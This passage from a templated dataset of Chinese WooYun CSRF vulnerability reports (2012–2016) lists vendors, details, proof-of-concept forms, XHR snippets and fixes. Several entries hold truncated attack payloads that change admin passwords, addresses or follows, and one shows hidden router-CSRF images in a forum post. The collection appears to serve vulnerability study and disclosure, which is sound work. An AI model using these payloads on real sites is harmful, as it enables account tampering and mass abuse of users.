1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 时光网微评功能设计缺陷导致跨站请求伪造(CSRF)#1poc：<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>get csrf</title></head><body><img src="https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 首先希望你们发微评的请求方式能够是POST，不建议用GET请求。其次，关于CSRF的修复建议 如下。1.验证码被认为是对抗CSRF攻击最简洁有效的防御方法。2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2015-098209] 菁优网某功能设计缺陷导致跨站请求伪造(CSRF)(附poc)
**厂商**: jyeoo.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 菁优网某功能设计缺陷导致跨站请求伪造(CSRF)(附poc).接口：https://example.com/[已脱敏]

**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=GB2312"><title>CSRF POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="a" value="CSRFTest"/><input type="hidden" name="b" value="1"/><input type="hidden" nam

**绕过**: 直接利用

**修复**: 1.验证码被认为是对抗CSRF攻击最简洁有效的防御方法。2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2015-0127928] 橡果国际CSRF漏洞
**厂商**: xiangguo.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="province" value="�#166;&#143;�#187;� /><input type="hidden" name="city" value="�#141;&#151;�#185;&#179;�#184;&#130;" /><input type="hidden" name="county" value="娴&#166;�#159;&#142;�#142;&#191;" /><input type="hidden" name="address" value="�#149;&#138;�#174;&#158;�#

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-049506] CSRF看我如何刷经纬网的粉丝
**厂商**: 经纬网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先说一下这只是做一个简单的测试,这个确实是可以CSRF蠕虫的出问题站点就是你们的总站啦!!站点对CSRF不设防,我来说个例子:这是加关注的接口https://example.com/[已脱敏]

**POC**: OK成功关注

**绕过**: 直接利用

**修复**: 请求还是加token比较好过小年啦应该送样礼物吧,,嘿嘿!!!
---

---
### [wooyun-2015-092029] 华夏名网csrf更改域名dns服务器
**厂商**: 华夏名网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 更改dns处没有任何token验证之类的

**POC**: 没有任何随机值验证构造表单访问恶意页面 之后在用户不知情的情况下直接更改dns需要被攻击者处于登陆华夏名网的状态 。

**绕过**: 直接利用

**修复**: 添加token即可
---

---
### [wooyun-2015-0116901] 土豆网某操作CSRF劫持用户
**厂商**: 土豆网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 有点鸡肋，因为参数里有一个uid，用来针对性让某人强制订阅你效果还是不错的.https://example.com/[已脱敏]

**POC**: 想批量刷粉丝也行，只需循环大量请求即可批量爬取用户ID然后填写进去POC：<img src="https://example.com/[已脱敏]"><img src="https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加token
---

---
### [wooyun-2015-0124763] 乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）
**厂商**: 乌云官方 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: CSRF删帖，利用十分简单。zone删（回）帖的函数：function DelComment(commentId){if(confirm("确定删除此内容?")){$.get('/index.php?do=edit&act=delcomment',{"fun":"ajax","id":commentId,"r":Math.random()},function(re){$("#commentLi_"+commentId).remove();});}}特征：GET请求，没有Token，也没有验证Referer（验不验证referer不重要，后面有说到）。目标URL：https://example.com/[已脱敏]

**POC**: 见上面。

**绕过**: 直接利用

**修复**: 增加token。验证Referer也是无效的，因为该请求就来自zone.wooyun.org。
---

---
### [wooyun-2012-05032] 某社交平台某社交平台可导致大面积病毒传播漏洞
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 微数据 发某社交平台缺少来源验证

**POC**: 看看这个某社交平台 https://example.com/[已脱敏] 可试下威力,记得试过了赶快删除某社交平台,以免传播开...<form action="https://example.com/[已脱敏]" method="post"  id="f2" target="ifr2"><input name="text" id="updatemsg" value=""><input name="picid" value="6d115173jw1dqo6buv5r0j"><input name="pic" value="https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1.加来源限制2.加是否是ajax判断
---

---
### [wooyun-2014-087506] 某通信厂商通讯政企网存在CSRF漏洞
**厂商**: 某通信设备厂商 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.某通信厂商通讯政企网：https://example.com/[已脱敏] ，name，gender，cartNo都是命令或者我们要修改的信息，没有用于csrf的随机token，然后再尝试修改不同的referer看是否采取了referer校验，结果表明不管referer是其他或者为空都能够成功修改信息。

**POC**: 1.构造一个修改个人信息的GET型CSRF POC：<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://example.com/[已脱敏]"><html xmlns="https://example.com/[已脱敏]" xml:lang="en"><head><meta http-equiv="Content-Type" content="text/html;charset=UTF-8"><title>test</title></hea

**绕过**: 直接利用

**修复**: 校验
---

---
### [wooyun-2012-012759] 苏宁论坛csrf
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 个人日志发帖，图片和视频插入处可以用">截断连接，从而插入embed标签。如图片链接http://"><embed/src=//tmxk.org>，也可以直接f12(chrome)在控制台编辑插入，效果如，https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 加强输入验证
---

---
### [wooyun-2015-0138030] 华夏名网csrf更改dns任意解析域名挖掘过
**厂商**: 华夏名网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-051557] 糗事百科csrf刷粉丝
**厂商**: 糗事百科 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 于是我给我的糗友发了一个链接，https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 天王盖地虎
---

---
### [wooyun-2014-048770] phpcms v9 后台任意文件删除缺陷
**厂商**: phpcms | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞文件：phpcms\modules\attachment\manage.php漏洞位置：123行public function pullic_delthumbs() {$filepath = urldecode($_GET['filepath']);$reslut = @unlink($filepath);if($reslut) exit('1');exit('0');}备注：1、进入此函数需要后台管理员权限2、验证了pc_hash，要csrf比较困难3、利用再难也不能忽略这是一个漏洞用途？在某些地方，删掉了某些配置，可以导致变量未初始化从而进行利用

**POC**: public function pullic_delthumbs() {$filepath = urldecode($_GET['filepath']);$reslut = @unlink($filepath);if($reslut) exit('1');exit('0');}

**绕过**: 直接利用

**修复**: 验证绝对路径，只允许删除附件目录内的文件。
---

---
### [wooyun-2012-015885] 某运营商手机邮箱csrf漏洞
**厂商**: 某运营商 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、邮箱服务器 https://example.com/[已脱敏] 个人测试的为186号段的邮箱。2、给自己发送了一封邮件，当然这里编辑器里没有直接编辑html代码的功能（不知道为什么现在很多邮箱都没了，为了安全？呵呵），直接抓包修改下img标签的src属性，改成我们的攻击表单地址，发送2、返回收件箱里查看，可以看到请求了，但是没有发送邮件，主要是因为这里的img标签请求得到的数据并没有执行。3、那我们只能利用外链的方式来发起攻击，这样利用场景就很多了，可以给受害者发送一封带外链的邮件，或者诱骗受害者访问你的邮件，攻击效果可能就不是那么完美了，但是危害依然存在。4、访问外链后，可以看到给自己发送了一封邮件，删除邮件也是可以的。

**POC**: 具体其他的攻击细节没有贴图，可自行验证！

**绕过**: 直接利用

**修复**: 你们是大户。
---

---
### [wooyun-2016-0176391] ACFUN所有接口未加验证 可实现完美蠕虫
**厂商**: 广州弹幕网络科技有限公司北京分公司 | **年份**: 2016 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先是修改签名的接口地址：https://example.com/[已脱敏]

**POC**: ACFUN登录状态下访问 https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 不要全部找一些刚毕业的，省钱不是这么省的
---

---
### [wooyun-2013-027098] 某社交平台某高危GET型csrf可引发蠕虫！！！
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 上传功能

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞存在于微活动转发处，本来是一个POST请求的，但是GET方式也可，所以危害瞬间提高了一个等级啊。https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 重要的操作一定要用POST啊！！！一定要有token啊！！！一定要验证referer啊！！！
---

---
### [wooyun-2015-0155532] 蜜芽主站csrf漏洞
**厂商**: 蜜芽 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站主站多处存在csrf，此处以修改收货地址处进行说明。修改收货地址，抓包拦截：可以看到消息体中无不可预测参数，故伪造csrf链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addressid=1421166&type=edit&truename=11111&prov=1&city=456&area=4443&town=42998&address=ffffff&mobile=13000000000&phone=");访问该链接

**POC**: 同上

**绕过**: 直接利用

**修复**: 验证referer加家随机数
---

---
### [wooyun-2015-0106712] 麦乐购某处一枚CSRF
**厂商**: 麦乐购 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: <form method="POST" name="form0" action="https://example.com/[已脱敏]"><input type="hidden" name="MAddressInfo.AddressId" value=""/><input type="hidden" name="MAddressInfo.UserId" value=""/><input type="hidden" name="MAddressInfo.TrueName" value="dfsadf"/><input type="hidden" name="pro

**绕过**: 直接利用

**修复**: 1、增加对来源的认证2、token
---

---
### [wooyun-2014-072681] 建站之星Sitestar设计缺陷可CSRF修改管理员密码
**厂商**: 建站之星 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 建站之星敏感功能csrf 可dump数据库对于这个洞中厂商的回复感觉坑爹，再来一处CSRF提醒下厂商。强烈建议查下CSRF的介绍。/admin/index.php?_m=mod_user&_a=admin_update&user[id]=1&passwd[passwd]=123123&passwd[re_passwd]=123123&user[email]=admin@admin.com&user[active]=1&user[s_role]=admin&user[full_name]=&user[mobile]=&submit=%E4%BF%9D%E5%AD%98该链接直接修改管理员密码为123123

**POC**: /admin/index.php?_m=mod_user&_a=admin_update&user[id]=1&passwd[passwd]=123123&passwd[re_passwd]=123123&user[email]=admin@admin.com&user[active]=1&user[s_role]=admin&user[full_name]=&user[mobile]=&submit=%E4%BF%9D%E5%AD%98

**绕过**: 直接利用

**修复**: 防御CSRF，加入token
---

---
### [wooyun-2013-033363] 人人网某处csrf漏洞（看着不顺眼？批量拉黑）
**厂商**: 人人网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: a.首先来看标题所说的，就是“加入黑名单”这个操作存在CSRF漏洞。登录用户访问 https://example.com/[已脱敏] 以后，就会将id为xxxxxx的用户加入黑名单。加入黑名单的效果就是如果原本是好友则解除好友，然后会收不到这个用户的加好友请求。站内信好像也会收不到~b.批量触发CSRF的功能就是人人的“分享”了。当分享一个网址时，人人会尝试解析网址，提取标题和内容以及图片。其中的图片最后直接输出到好友的信息流里，于是这个图片就可以拿来批量触发了。对于一个好友数为1000的人人用户来说，触发效果不一般~ 以及如果这个分享很吸引眼球且有时效性，被不少人分享的话，效果会进一步增强。另外，也可以用来触发其他的任务……比如可以利用人人好友来批量刷票（GET）、批量刷访问量等等…… 很久以前还可以用来批量抓iOS人人客户端的token..////////

**POC**: a. 加黑名单..访问下地址就可以拉黑了，不贴过程了……b. 测试B的时候我就不用拉黑了吧。。给自己刷刷来访吧。。1) 构造一个如下的页面页面里有个隐藏的img（防止小伙伴们发现问题=w=分享完以后改成301跳转那就效果更好了~2) 分享一下3) 于是回到新鲜事。。浏览器请求了这张“图片”（我对图片执行了一下301跳转~ 浏览器实际上会访问我的主页）（注：人人的分享图片有个onerror则销毁自身DOM #*&(#&*$，所以看DOM是看不到图片的。。）话说发现人人的好友/自己的Profile底部今天出现了这些东西，这是什么情况？

**绕过**: 直接利用

**修复**: a. 你们比我懂b. 你们比我懂，分享的图片在服务器也抓一下做个缩略图就行了。貌似在首页分享的图片最近在某些情况下已经这样做了，但是遗漏的地方很多啊 ← ←
---

---
### [wooyun-2013-019051] 某社交平台某社交平台手机版两处csrf漏洞，可强制发某社交平台，加关注话题
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 点击链接https://example.com/[已脱敏]

**POC**: 点击链接https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1-先关注某社交平台某社交平台@1OO0O2-然后这两个功能的链接里面添加st=****的验证第一步可以跳过哈哈哈哈
---

---
### [wooyun-2013-025820] 再说某社交平台csrf刷粉丝
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1）看新闻的时候，晃眼看见的，城市频道上应该都有，收听一个人直接GET请求；https://example.com/[已脱敏]

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 你们的token呢
---

---
### [wooyun-2014-054896] 太平洋汽车网-某互联网公司 OAuth 2.0 redirect_uir CSRF 漏洞
**厂商**: 太平洋汽车网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 太平洋汽车网-某互联网公司 OAuth 2.0 认证流程中https://example.com/[已脱敏]

**POC**: 如果登录了太平洋汽车的用户误点了这个request. 太平洋汽车会将用户redirect到主页。然后我们进绑定中心可以发现，绑定成功

**绕过**: 直接利用

**修复**: 建议厂商采取有效的方式来抵抗针对 OAuth 2.0 redirect_uir 的CSRF 攻击。比如：1. 在将用户账号绑定至第三方账号之前，强制用户重新输入帐号密码。缺点： 会牺牲用户体验。 因为大多数用户在登录了以后，是不想再输入密码的。2. 通过验证 referer的值来抵抗CSRF 攻击，
---

---
### [wooyun-2014-087927] 乐蜂网某处CSRF刷关注
**厂商**: 乐蜂网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: POST /weibo/follow?&u=t&lg=n&uid=49679472 HTTP/1.1Host: f.lefeng.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestReferer: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0128568] 太平洋女性网多处存在csrf
**厂商**: 太平洋女性网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]"POST", "https://example.com/[已脱敏]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("borthday=2015-07-10&skin=0&weight=55.0&height=170.0&blog=99999999999999999&weibo=

**POC**: poc####伪造链接，主要代码如下：xmlhttp.open("POST", "https://example.com/[已脱敏]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("borthday=2015-07-10&skin=0&weight=55.0&height=170.0&blog=99999999999999999&weib

**绕过**: 直接利用

**修复**: 验证referer加token
---

---
### [wooyun-2012-08609] 某门户网站某处CSRF漏洞
**厂商**: 某门户网站 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="msg" value="XXXXXXXXXXXXXX" /><input type="submit" value="submit" /></form><script>document.imlonghao.submit();</script></body></htm

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2013-042571] 双十一某电商平台论坛惊现“路由器CSRF”恶意攻击代码（其他论坛可能一样中招）
**厂商**: 某电商平台网 | **年份**: 2013 | **类型**: 钓鱼欺诈信息

**元思考**: 触发信号: 功能测试

**洞察**: 钓鱼欺诈信息防护不足，开发者信任前端输入

**测试流程**:
1. 识别钓鱼欺诈信息相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先地址是这个：https://example.com/[已脱敏]

**POC**: 关键页面代码存个档<div class='ke-post'><p>学习学习!</p><p><img height="0" src="https://example.com/[已脱敏]" style="height: 0.0px;width: 0.0px;float: none;margin: 0.0px;" width="0"/></p><p><img height="0" src="https://example.com/[已脱敏]" style="height: 0

**绕过**: 直接利用

**修复**: 某电商平台管管不？
---

---
### [wooyun-2015-0106697] 香舍网某处一枚CSRF
**厂商**: 香舍网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: <form method="POST" name="form0" action="https://example.com/[已脱敏]"><input type="hidden" name="MAddressInfo.AddressId" value=""/><input type="hidden" name="MAddressInfo.UserId" value=""/><input type="hidden" name="MAddressInfo.TrueName" value="sadfsdf"/><input type="hidden" name

**绕过**: 直接利用

**修复**: 1、判断来源2、token
---

---
### [wooyun-2013-035239] 天涯CSRF系列一:随意劫持用户黑名单操作权限
**厂商**: 天涯社区 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Cross-siterequestforgery 漏洞，劫持用户黑名单操作，任意操作增删黑名单。漏洞证明将实现如何利用这个漏洞。

**POC**: 经过抓包，我发现一条有趣的GET请求https://example.com/[已脱敏])所以我们在文章编辑里点击插入图片(这里吐槽一下，天涯的博客程序居然是ASP的)我们先直接插入https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: CSRF的防御你们可以查一下相关资料。比如加入token
---

---
### [wooyun-2013-017636] 某社交平台SAE普通开发者认证CSRF
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.在邀请链接后面加上&makesure=1，然后到某社交平台开发者论坛回复插入下面的代码，别人在登陆了SAE的情况下打开有该代码的帖子会自动邀请指定用户。[img=1,1]https://example.com/[已脱敏]]2.插入https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 你懂的
---

---
### [wooyun-2015-0129539] 某零食电商CSRF漏洞致信息被篡改
**厂商**: 某零食电商 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="memberAttribute&#95;1" value="�#152;&#191;�#144;&#168;�#190;&#190;" /><input type="hidden" name="memberAttribute&#95;2" value="male" /><input type="hidden" name="memberAttribute&#95;3" value="2015&#45;07&#45;09" /><input type="hidden" name="memberAttri

**POC**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="memberAttribute&#95;1" value="�#152;&#191;�#144;&#168;�#190;&#190;" /><input type="hidden" name="memberAttribute&#95;2" value="male" /><input type="hidd

**绕过**: 直接利用

**修复**: 多谢来搞
---

---
### [wooyun-2014-071676] 用另一个低级的漏洞向豌豆荚用户手机后台静默推送并安装任意应用
**厂商**: 豌豆荚 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 昨天提交了一个：WooYun: 用一个低级的漏洞向豌豆荚用户手机后台静默推送并安装任意应用这是CSRF引起的问题，而前端安全中还有一个和CSRF是好兄弟的漏洞类型：Clickjacking（点击劫持）是一种视觉欺骗手段，在web端就是iframe嵌套一个透明不可见的页面，让用户在不知情的情况下，点击攻击者想要欺骗用户点击的位置通过测试发现wandoujia.com域下所有网站都没有对ClickJacking做防护，即使你们修复了CSRF，利用这个漏洞还是可以造成同样的攻击效果。#POC构造思路在手机客户端安装豌豆荚且登录的用户可以通过豌豆荚网页版向自己的手机无数据线推送应用，很方便，但是因为没有对ClickJacking做应有的防御,可以构造POC网页恶意网页有可能是一个网页游戏，也有可能是一个假的领奖页面，如下：看上去是个领奖页面，但是其实这个页面下面还覆盖了一层，我们将最上面这层设置为

**POC**: POC代码：链接: https://example.com/[已脱敏] 密码: qgu5*仅作演示使用，没有做的过于精细，要攻击起来可以做的逼真，达到欺骗效果

**绕过**: 直接利用

**修复**: 国内几个大型网站很多业务都没有做ClickJacking的防御，可能是因为“攻击成本太高了”，但是一旦被利用，也会造成不小的危害，发这个报告另一个目的是为了证明ClickJacking不只是能用来给自己的某社交平台某社交平台刷刷粉的漏洞类型。JS防御方案（核心思路是判断自身是否在网页框架的最顶层）<head><
---

---
### [wooyun-2014-054895] 太平洋电脑网-某电商平台 OAuth 2.0 redirect_uir CSRF 漏洞
**厂商**: 太平洋电脑网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 太平洋电脑网-某电商平台 OAuth 2.0 认证流程中https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 建议厂商采取有效的方式来抵抗针对 OAuth 2.0 redirect_uir 的CSRF 攻击。比如：1. 在将用户账号绑定至第三方账号之前，强制用户重新输入帐号密码。缺点： 会牺牲用户体验。 因为大多数用户在登录了以后，是不想再输入密码的。2. 通过验证 referer的值来抵抗CSRF 攻击，
---

---
### [wooyun-2012-08611] 某互联网公司某处CSRF漏洞
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="content" value="XXXXXXXXXXX" /><input type="submit" value="submit" /></form><script>document.imlonghao.submit();</

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2015-0114402] 苏宁某一处csrf
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="folderName" value="&#x59B9;&#x7EB8;&#xFF0C;&#x6765;&#x4E00;&#x70AE;&

**绕过**: 直接利用

**修复**: 1：加个token 别太懒了。。我真想对程序员说，给你一百个赞，不然我都没办法在乌云装逼了
---

---
### [wooyun-2014-088283] csdn某业务csrf删除评论
**厂商**: CSDN开发者社区 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 评论内容可以进行任意删除,利用csrf漏洞~让作者去浏览自己设置好的页面~~评论的id在源代码中可以找到 如图：然后我们 直接 一句话htmldel=｛写如删除的评论id｝<img src="https://example.com/[已脱敏]">clickok 搞定~~~

**POC**: 如上所说~~~

**绕过**: 直接利用

**修复**: 修复下这种类型的问题~~~
---

---
### [wooyun-2013-024976] 115网盘个人资料修改有csrf
**厂商**: 广东雨林木风计算机科技有限公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 个人资料这里，post的其实用get也行。。到圈子发张图https://example.com/[已脱敏] 用钱摇摇的地方也有。。把人钱用掉了然后打赏的地方你猜有没有？？

**POC**: 上面都说了，基本全站好多地方都有，不一一列举。。顺便给个年会吧。。

**绕过**: 直接利用

**修复**: 代币，refer，get检查。。
---

---
### [wooyun-2015-0125759] 美图秀秀旗下网站美拍CSRF漏洞（刷关注）
**厂商**: 美图秀秀 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]  看到美拍，我们注册两个帐号。然后看到有关注，OK，抓包看下。我们构造poc我们换个帐号登录

